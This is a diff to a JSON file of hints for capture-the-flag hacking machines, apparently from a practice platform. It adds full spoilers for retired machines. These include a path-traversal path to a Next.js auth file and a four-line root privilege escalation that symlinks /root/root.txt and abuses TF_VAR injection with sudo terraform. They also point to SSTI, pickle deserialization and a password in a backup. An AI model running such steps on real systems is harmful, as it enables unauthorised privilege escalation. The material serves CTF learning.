@@ -120,13 +120,13 @@
         "machine_rating": "4.3",
         "user_blood": "Razzty",
         "root_blood": "celesian",
-        "tags": "",
-        "is_live": "true",
+        "tags": "CVE-2025-29927,lfi,terraform",
+        "is_live": "false",
         "hints": {
             "initial_access": {
                 "level_1": "authentication bypass",
                 "level_2": "another typical  web vuln and look for js files that might contain creds",
-                "all_in": ""
+                "all_in": "user at /../../.next/server/pages/api/auth/[...nextauth].js"
             },
             "user": {
                 "level_1": "",
@@ -136,7 +136,7 @@
             "root": {
                 "level_1": "you can't modify the Terraform files but Terraform has a specific naming convention (TF_VAR_name) to inject values into configurations",
                 "level_2": "The validation logic is flawed because it only checks if the string /root/examples/ is present anywhere in your path (symlinc)",
-                "all_in": ""
+                "all_in": "1. ln -s /root/root.txt /tmp/root/examples/root.txt<br>2. export TF_VAR_source_path=\"/tmp/root/examples/root.txt\"<br>3. sudo /usr/bin/terraform -chdir\\=/opt/examples apply<br>4. cat /home/jeremy/docker/previous/public/examples/root.txt"
             }
         }
     },
@@ -204,13 +204,13 @@
         "machine_rating": "3.7",
         "user_blood": "gumby",
         "root_blood": "l1nvx",
-        "tags": "",
-        "is_live": "true",
+        "tags": "django,ssti,deserialization,pickle,gpg,backup",
+        "is_live": "false",
         "hints": {
             "initial_access": {
                 "level_1": "i like SSTI, users.values",
                 "level_2": "like the private user's post",
-                "all_in": ""
+                "all_in": "GET /like/23 and then GET /likes/23"
             },
             "user": {
                 "level_1": "",
@@ -220,7 +220,7 @@
             "root": {
                 "level_1": "/var/tmp/django_cache/ (Pickle)",
                 "level_2": "/var/www/HackNet/backups",
-                "all_in": ""
+                "all_in": "root password in backup02.sql"
             }
         }
     },
@@ -419,8 +419,37 @@
                 "all_in": ""
             }
         }
+    },
+    "browsed": {
+        "machine_image": "images/icon16.png",
+        "machine_type": "linux",
+        "machine_difficulty": "medium",
+        "machine_creator": "Tensho",
+        "machine_rating": "4.6",
+        "user_blood": "anon8711",
+        "root_blood": "lowercasenumbers",
+        "tags": "",
+        "is_live": "true",
+        "hints": {
+            "initial_access": {
+                "level_1": "",
+                "level_2": "",
+                "all_in": ""
+            },
+            "user": {
+                "level_1": "the developper browsed a new url",
+                "level_2": "Bash doesn't treat arithmetic input as plain text",
+                "all_in": ""
+            },
+            "root": {
+                "level_1": "__(^~^)__",
+                "level_2": "Controlling cached bytecode can be as powerful as controlling source",
+                "all_in": ""
+            }
+        }
     }
 }
 
 
    
+
